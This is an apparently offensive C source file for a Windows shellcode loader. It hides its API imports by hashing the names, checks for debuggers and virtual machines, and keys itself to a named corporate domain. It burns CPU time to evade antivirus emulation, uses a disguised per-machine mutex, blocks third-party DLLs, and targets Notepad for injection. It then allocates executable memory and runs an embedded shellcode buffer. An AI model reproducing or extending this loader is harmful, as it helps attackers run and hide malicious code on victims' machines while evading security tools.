//////////////////////////////////////////////////////////////
// A simple loader, with bunch of stuff written in x64 ASM
// Author: 0xpwnisher 
//////////////////////////////////////////////////////////////

#pragma once

#include <Windows.h>
#include <stdio.h>
#include "include.h"

/*
All Definitions, Macros etc #define MAX_BUF_SIZE    2048
*/

#define MAX_SIZE   255
#define MIN_SIZE   5
#define PPOWER     255 
#define MAX        1000000000   
#define _DOMAIN    L"RADIANTCORP"
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define ProductKey_Reg ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\DefaultProductKey2")
// #define MUTEX_NAME TEXT("Global\\Tcpip_Perf_Library_Lock_PID_145af") replaced with random Mutex Generation

// API hashes
#define DomainHash         0x461A488C
#define VirtualFreeHash    0x81178A12
#define OpenProcessHash    0x74F0ACB6
#define VirtualAllocHash   0x38E87001
#define NtQuerySysInfoHash 0x37072D8A

// External Functions from ASM
extern PVOID   GetENVAddr();
extern BOOL    IsDbgPresent();
extern PVOID   GetNTDLLBase();
extern PVOID   GetK32ModuleHandle();

// kernel32.dll exports
typedef BOOL     (WINAPI* CLOSEHANDLE)(HANDLE);
typedef HANDLE   (WINAPI* GETCURRENTPROCESS)();
typedef HMODULE  (WINAPI* LOADLIBRARYA)(LPCSTR);
typedef HANDLE   (WINAPI* _tOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL     (WINAPI* _tVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef LPVOID*  (WINAPI* _tVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE   (WINAPI* _tCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef BOOL     (WINAPI* _tSetProcessMitigationPolicy)( PROCESS_MITIGATION_POLICY ,PVOID,SIZE_T);

// ntdll.dll exports
typedef NTSTATUS (NTAPI* _tNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

// Other internal function declarations

VOID    PreChecks();
VOID    EnvChecks();
VOID    AmIDebugged();
CHAR*   GetDynamicMutex();
PWSTR   ReadEnvValue(PWSTR);
FARPROC GetFuncAddr(PVOID, DWORD);


// Struct Defenitions

typedef uint64_t* PQWORD;

enum SYSTEM_INFORMATION_CLASS {
	SystemExtendedProcessInformation = 57
};

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

void handleError(char* ErrMsg) {
	// Function to handle errors properly

	// GetLastError();
	printf("Error: %s\n", ErrMsg);

}

static char* rand_string(char* str, size_t size)
{
	const char charset[] = "1234567890abcdef";
	if (size) {
		--size;
		for (size_t n = 0; n < size; n++) {
			int key = rand() % (int)(sizeof charset - 1);
			str[n] = charset[key];
		}
		str[size] = '\0';
	}
	return str;
}

DWORD __forceinline compute_hash(const void* input, UINT32 len)
{
	const unsigned char* data = (const unsigned char*)input;

	DWORD hash = 2166136261;

	while (1)
	{
		char current = *data;
		if (len == 0)
		{
			if (*data == 0)
				break;
		}
		else
		{
			if ((UINT32)(data - (const unsigned char*)input) >= len)
				break;

			if (*data == 0)
			{
				++data;
				continue;
			}
		}

		// toupper
		if (current >= 'a')
			current -= 0x20;

		hash ^= current;
		hash *= 16777619;

		++data;
	}

	return hash;
}


FARPROC GetFuncAddr(PVOID ModuleBase, DWORD dwProcHash)
{
	LPBYTE lpBaseAddress = (PVOID)ModuleBase;	
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(lpBaseAddress + pDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddress + pDataDir->VirtualAddress);
	LPDWORD pNames = (LPDWORD)(lpBaseAddress + pExportDir->AddressOfNames);
	LPWORD pOrdinals = (LPWORD)(lpBaseAddress + pExportDir->AddressOfNameOrdinals);

	for (SIZE_T i = 0; i < pExportDir->NumberOfNames; ++i)
	{
		char* szName = (char*)lpBaseAddress + (DWORD_PTR)pNames[i];

		if (compute_hash(szName, 0) == dwProcHash)
			return (FARPROC)(lpBaseAddress + ((DWORD*)(lpBaseAddress + pExportDir->AddressOfFunctions))[pOrdinals[i]]);
	}

	return NULL;
}


PWSTR ReadEnvValue(PWSTR Key) {

	// Can totally get from ASM 
	
	/* PPEB pPEB = (PPEB)__readgsqword(0x60);
	PVOID params = (PVOID) * (PQWORD)((PBYTE)pPEB + 0x20);
	PWSTR environmental_variables = (PWSTR) * (PQWORD)((PBYTE)params + 0x80);
	*/
	
	// Envvarable Pointer now comes from ASM Func
	PWSTR environmental_variables = (PWSTR) * (PQWORD)((PBYTE)GetENVAddr() + 0x80);

	while (environmental_variables)
	{
		PWSTR m = wcsstr(environmental_variables, Key);
		if (m) break;
		environmental_variables += wcslen(environmental_variables) + 1;
	}
	PWSTR computerName = wcsstr(environmental_variables, L"=") + 1;

	return computerName;
}

DWORD dllpolicy() {

	HMODULE Hmod;
	PROCESS_MITIGATION_POLICY  policy;
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {0};
	sp.MicrosoftSignedOnly = 1;
	CHAR dllpolicy[] = { 'S','e','t','P','r','o','c','e','s','s','M','i','t','i','g','a','t','i','o','n','P','o','l','i','c','y',0x0 };

	 Hmod = GetK32ModuleHandle();
	_tSetProcessMitigationPolicy SetPolicy = (_tSetProcessMitigationPolicy)GetProcAddress(Hmod, dllpolicy);
	 policy = ProcessSignaturePolicy;
	 SetPolicy(policy, &sp, sizeof(sp));

	return 0;
}

void EnvChecks() {
	
	WCHAR userdomain[]   = { 'U','S','E','R','D','O','M','A','I','N',0 };
	WCHAR logonserver[]  = { 'L','O','G','O','N','S','E','R','V','E','R',0 };
	PWSTR  computer, domain;
	
	// Get Logon Server , I.e Hostname or DC Name
	 computer = ReadEnvValue(logonserver);
	 printf("DC: %ws\n", computer);

	//Get AD Domain Name Joined
	 domain = ReadEnvValue(userdomain);
	 printf("USERDOMAIN: %ws\n", domain);

	/*
	//Get DNS Server of Connected Domain
	PWSTR USERDNSDOMAIN = L"USERDNSDOMAIN=";
	PWSTR dnsname = ReadEnvValue(USERDNSDOMAIN);
	*/

	// Change to Hash Compare, Hardcoding not good
	if (wcscmp(domain, _DOMAIN) == 0) {
		printf("Match\n");
	}
}

void AmIDebugged() {
	void* isb = 0;
	if (IsDbgPresent()) { printf("\nDebugger present  %d\n", IsDbgPresent()); }
	printf("\nNo Debugger  %d\n", IsDbgPresent());
}

typedef struct _REAL_DISPLAY_DEVICE
{
	DWORD cb;
	TCHAR DeviceName[32];
	TCHAR DeviceString[128];
	DWORD StateFlags;
	TCHAR DeviceID[128];
	TCHAR DeviceKey[128];
} REAL_DISPLAY_DEVICE;


BOOL(WINAPI* _EnumDisplayDevicesA)(
	LPSTR lpDevice,                // device name
	DWORD iDevNum,                   // display device
	REAL_DISPLAY_DEVICE* DisplayDevice, // device information
	DWORD dwFlags                    // reserved
	) = NULL;


void checkvm() {

		DWORD iDevNum = 0;
		DEVMODEA DevMode = { .dmSize = sizeof(DEVMODEA) };
		DISPLAY_DEVICEA DisplayDevice = { .cb = sizeof(DISPLAY_DEVICEA) };

		while (EnumDisplayDevicesA(NULL, iDevNum, &DisplayDevice, EDD_GET_DEVICE_INTERFACE_NAME))
		{

			DWORD State = DisplayDevice.StateFlags;
			//printf("%s\n", DisplayDevice.DeviceName);
			printf("  %s\n", DisplayDevice.DeviceString);
			
			char* test = DisplayDevice.DeviceString;
			
			if (EnumDisplaySettingsExA(DisplayDevice.DeviceName, ENUM_CURRENT_SETTINGS, &DevMode, 0))
			{
				
			}
			iDevNum++;
		}
	}

// Unique Mutex for each machine
unsigned int MutexCheck(const char* name) {

	HANDLE mutex = NULL, error = NULL;
	mutex = CreateMutexA(NULL, TRUE, name);
	if (mutex == NULL) {
		// Error creating the mutex. This could be because
		// we are trying to create a Global mutex and it exists
		// already.
		printf("Null Mutex\n");
		return FALSE;
		
	}
	else {
		// Handle has been returned
		error = (HANDLE)GetLastError();
		if (error == (HANDLE)ERROR_ALREADY_EXISTS) {
			// Mutex already exists
			printf("exists error\n");
			return FALSE;
		}
		else {
			return TRUE;
		}
	}
}
	

void PreChecks() {

	// Mutex Check
	// MutexCheck();
	
	// Debugger and VM / Sandbox Checks
	AmIDebugged();

	// Environmental Keying
	EnvChecks();

	/*
	// Internet Connectivity Checks - Proxy Checks & Fetch 
	Connectivity();

	// VPN Connectivity Checks (Tun0 Interafce or Resolve Internal Domain)
	VpnCheck();
	*/
}


int FindProcID(wchar_t* procName)
{
	NTSTATUS status;
	PVOID buffer, k32addr, ntdladdr, VAllocAddr, VFreeAddr, NtQSysInfo;
	PSYSTEM_PROCESS_INFO spi;
	
	k32addr = (PVOID)GetK32ModuleHandle();
	if (!k32addr) {

		handleError("Error Finding Kernel32\n");
	}
	
	ntdladdr = (PVOID)GetNTDLLBase();
	if (!ntdladdr) {

		handleError("Error Finding NTDLL\n");
	}

	VFreeAddr  = (ULONG_PTR)GetFuncAddr((HMODULE)k32addr,  VirtualFreeHash);
	VAllocAddr = (ULONG_PTR)GetFuncAddr((HMODULE)k32addr,  VirtualAllocHash);
	NtQSysInfo = (ULONG_PTR)GetFuncAddr((HMODULE)ntdladdr, NtQuerySysInfoHash);

	// We need to allocate a large buffer because the process list can be large.
	buffer = ((_tVirtualAlloc)VAllocAddr)(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	if (!buffer)
	{
		printf("\nError: Unable to allocate memory for process list (%d)\n", GetLastError());
		return -1;
	}
	
	spi = (PSYSTEM_PROCESS_INFO)buffer;
	if (!NT_SUCCESS(status = ((_tNtQuerySystemInformation)NtQSysInfo)(SystemExtendedProcessInformation, spi, 1024 * 1024, NULL)))
	{
		printf("\nError: Unable to query process list (%#x)\n", status);

		((_tVirtualFree)VFreeAddr)(buffer, 0, MEM_RELEASE);
		return -1;
	}

	while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
	{	
		if (lstrcmpiW(procName, spi->ImageName.Buffer)==0)
		{
			printf("PID of Notepad: %d\n", spi->ProcessId);
			return spi->ProcessId;
			break;
		}
		spi = (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset); // Calculate the address of the next entry.
	}

	printf("\nPress any key to continue.\n");
	getchar();
	((_tVirtualFree)VFreeAddr)(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
	return 0;
}


// Some Math Shit i got from SO
// https://math.stackexchange.com/questions/23105/what-set-of-10-digit-numbers-with-k-prime-factors-has-largest-cardinality
// Takes about 40-55 seconds on host with better ram 
// Better then using Sleep or waitforsingleobject ? 
int TimeBomb(int n) {

	// allocate MAX bytes of memory
	unsigned char sieve[MAX];

	// use # of factors as index, # of ints is value
	unsigned long tally[100];

	unsigned long i, j;
	int c;

	for (i = 2; i < MAX; i++) {

		if (sieve[i] != PPOWER) {
			// if composite, tally and continue
			if (sieve[i] > 0) {
				tally[sieve[i]]++;
				continue;
			}

			// ok, i is prime; tally and mark all prime powers as PPOWER
			// (takes some thought to see why we do this)
			tally[1]++;
			j = i * i;
			c = 2;
			while (j < MAX) {
				sieve[j] = PPOWER;
				tally[c]++;
				j = j * i;
				c++;
			}
		}

		// now sieve as usual
		for (j = i * 2; j < MAX; j += i) {
			if (sieve[j] != PPOWER)
				sieve[j]++;
		}
	}

	for (c = 1; c < 100; c++)
		if (tally[c]) printf("%.2d: %ld\n", c, tally[c]);
}

  char* GetDynamicMutex() {

	#define BUFFER 8192

	char value[255];
	DWORD BufferSize = BUFFER;
	CHAR OSID[] = {'O','S','P','r','o','d','u','c','t','C','o','n','t','e','n','t','I','D', 0};
	RegGetValueA(HKEY_LOCAL_MACHINE, ProductKey_Reg, OSID, RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
	
	int len = strlen(value);

	char* last_four = &value[len - 7];
	
	char mutexe[50] = "Global\\Tcpip_Perf_Library_Lock_PID_";
	strcat_s(mutexe, 50, last_four);
	printf("\nmutex value %s\n", mutexe);

	return mutexe;
	
}


// Memory intense math operation routine
// Probably have this in asm ? but we need to consume time so in C?
// implement slowest Hashing function , but bcrypt in C is hard 

// Time based av emulation evasion
// Consider it as Sleep() alternative
// TimeBomb(2);

int wmain() {
	


	// Dynamic mutex lock based on osproductcontentid
	// Unique mutex names on each PC

	 char mutexe[80];
	 strcpy_s(mutexe, 80 , GetDynamicMutex()); 

	 // First thing to check is Mutex lock
	if (!MutexCheck(mutexe)) { printf("Mutex Exists\n");  return; }

	_getch();
	checkvm();

	// Target Process to Inject into
	WCHAR procname[] = { 'N','o','t','e','p', 'a', 'd', '.', 'e','x','e', 0 };

	
	// Run set of Prelim Checks
	PreChecks();
	// Block DLL's
	dllpolicy();

	// All Required Variables
	HANDLE hProc = INVALID_HANDLE_VALUE;
	PVOID k32addr, OpenProcAddr;
	DWORD pid;

	// All Good, resolve needed functions 
	
	k32addr = (PVOID)GetK32ModuleHandle();
	printf("Address of Kernel32: %p\n", k32addr);

	if (!k32addr) {

		handleError("Error Finding Kernel32\n");
	}
	OpenProcAddr = (ULONG_PTR)GetFuncAddr((HMODULE)k32addr, OpenProcessHash);
	hProc = ((_tOpenProcess)OpenProcAddr)(PROCESS_ALL_ACCESS, FALSE, FindProcID(procname));
	


	_getch();

	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	memcpy(exec, shellcode, sizeof(shellcode));
	
	((void(*)())exec)();


	return 0;
}
